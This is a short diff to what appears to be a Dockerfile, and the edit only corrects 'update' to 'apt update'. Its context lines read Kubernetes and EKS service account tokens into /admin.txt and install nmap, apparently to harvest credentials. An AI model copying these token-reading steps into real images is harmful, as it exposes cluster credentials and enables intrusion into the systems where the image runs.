@@ -5,7 +5,7 @@ RUN echo `cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token` >> /admin
 RUN echo `cat /var/run/secrets/kubernetes.io/serviceaccount/token` >> /admin.txt
 RUN apt-get update
 RUN apt-get install nmap -y
-RUN update
+RUN apt update
 RUN apt install net-tools -y
 RUN pip install -r requirements.txt
 ENTRYPOINT ["python"]
